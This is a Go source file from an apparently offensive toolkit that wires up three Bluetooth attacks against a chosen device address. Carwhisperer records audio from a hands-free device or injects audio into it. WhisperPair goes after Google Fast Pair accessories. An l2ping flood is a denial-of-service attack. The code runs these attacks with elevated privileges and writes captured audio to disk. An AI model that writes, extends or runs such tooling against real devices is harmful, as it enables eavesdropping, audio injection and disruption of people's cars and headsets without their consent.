package bluetooth

import (
	"context"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/czhax/czhax/internal/workdir"
)

// AttackKind is a Bluetooth action offered by the scanner.
type AttackKind int

const (
	AttackCarwhisperer AttackKind = iota
	AttackWhisperPair
	AttackL2Flood
)

func (k AttackKind) String() string {
	switch k {
	case AttackCarwhisperer:
		return "Carwhisperer"
	case AttackWhisperPair:
		return "WhisperPair"
	case AttackL2Flood:
		return "l2ping flood"
	default:
		return "Bluetooth attack"
	}
}

// AttackRequest targets one Classic/BLE peer.
type AttackRequest struct {
	Kind       AttackKind
	HCI        string
	Address    string
	AddrType   string
	Name       string
	Record     bool
	RecordPath string
	PlayPath   string
	FastPair   bool
	ModelID    uint32
}

// RunAttack executes the selected action. It streams human-readable progress
// lines to onLine and blocks until the action ends or ctx is cancelled.
func RunAttack(ctx context.Context, req AttackRequest, onLine func(string)) error {
	switch req.Kind {
	case AttackCarwhisperer:
		return runCarwhispererAttack(ctx, req, onLine)
	case AttackWhisperPair:
		return runWhisperPair(ctx, req, onLine)
	case AttackL2Flood:
		return runL2Flood(ctx, req, onLine)
	default:
		return fmt.Errorf("unsupported Bluetooth action")
	}
}

func runL2Flood(ctx context.Context, req AttackRequest, onLine func(string)) error {
	if _, err := exec.LookPath("l2ping"); err != nil {
		return errors.New("l2ping not installed (install the bluez package)")
	}
	if onLine != nil {
		onLine("l2ping flood " + NormalizeAddr(req.Address) + " via " + NormalizeHCI(req.HCI))
	}
	args := []string{"-i", NormalizeHCI(req.HCI), "-s", "600", "-f", NormalizeAddr(req.Address)}
	return streamPrivileged(ctx, "l2ping", args, onLine)
}

func runCarwhispererAttack(ctx context.Context, req AttackRequest, onLine func(string)) error {
	if os.Geteuid() == 0 {
		return Carwhisperer(ctx, req.HCI, req.Address, req.RecordPath, req.PlayPath, req.Record, onLine)
	}
	exe, err := executablePath()
	if err != nil {
		return err
	}
	args := []string{
		"bt", "carwhisperer",
		"--hci", NormalizeHCI(req.HCI),
		"--addr", NormalizeAddr(req.Address),
		"--record", req.RecordPath,
	}
	if !req.Record {
		args = append(args, "--no-record")
	}
	if strings.TrimSpace(req.PlayPath) != "" {
		args = append(args, "--play", req.PlayPath)
	}
	if onLine != nil {
		onLine("Starting Carwhisperer on " + NormalizeAddr(req.Address))
	}
	return streamPrivileged(ctx, exe, args, onLine)
}

func runWhisperPair(ctx context.Context, req AttackRequest, onLine func(string)) error {
	if _, err := exec.LookPath("gatttool"); err == nil {
		return runFastPairInvalidCurve(ctx, req, onLine)
	}
	if bin := findWhisperPair(); bin != "" {
		if onLine != nil {
			onLine("Running WhisperPair reference CLI for " + NormalizeAddr(req.Address))
		}
		return streamCommand(ctx, bin, []string{"verify", NormalizeAddr(req.Address), "--authorized"}, onLine)
	}
	return errors.New("gatttool not installed (install bluez-deprecated-tools) for the built-in WhisperPair test")
}

// auditFastPair is the built-in fallback when the external WhisperPair toolkit
// is not installed. Active pairing-state tests need the model's anti-spoofing
// public key from Google's Fast Pair API, which CZHax does not replicate.
func auditFastPair(ctx context.Context, req AttackRequest, onLine func(string)) error {
	say := func(s string) {
		if onLine != nil {
			onLine(s)
		}
	}
	say("WhisperPair CLI not found; running the built-in Fast Pair audit")
	info, err := QueryDeviceInfo(ctx, req.Address)
	if err != nil && info.Address == "" {
		return fmt.Errorf("bluetoothctl info: %w", err)
	}
	if info.Address != "" {
		say("Device: " + info.DisplayName() + " (" + info.Address + ")")
	}
	fastPair := req.FastPair || info.FastPair
	modelID := req.ModelID
	if info.HasModelID {
		modelID = info.ModelID
	}
	switch {
	case fastPair && modelID != 0:
		say(fmt.Sprintf("Fast Pair service 0xFE2C detected · Model ID 0x%06X", modelID))
		say("The device advertises Fast Pair outside pairing mode.")
		say("Active predicate test needs this model's anti-spoofing public key.")
		say("Install the WhisperPair reference toolkit for the full attack.")
	case fastPair:
		say("Fast Pair service 0xFE2C detected")
		say("Model ID was not exposed in the scan; rescan in BLE mode.")
	default:
		say("No Fast Pair (0xFE2C) service data observed for this device")
		say("Rescan in BLE mode while the accessory is advertising.")
	}
	return nil
}

func findWhisperPair() string {
	for _, name := range []string{"whisperpair", "whisperpair-cli"} {
		if p, err := exec.LookPath(name); err == nil {
			return p
		}
	}
	return ""
}

// CarwhispererRecordPath returns a per-run 8 kHz WAV destination.
func CarwhispererRecordPath(address string) string {
	return CarwhispererRecordPathIn(workdir.Resolve(""), address)
}

func CarwhispererRecordPathIn(root, address string) string {
	dir := workdir.BT(root)
	_ = os.MkdirAll(dir, 0o700)
	addr := strings.ReplaceAll(NormalizeAddr(address), ":", "")
	name := fmt.Sprintf("carwhisperer-%s-%s.wav", addr, time.Now().Format("20060102-150405"))
	return filepath.Join(dir, name)
}
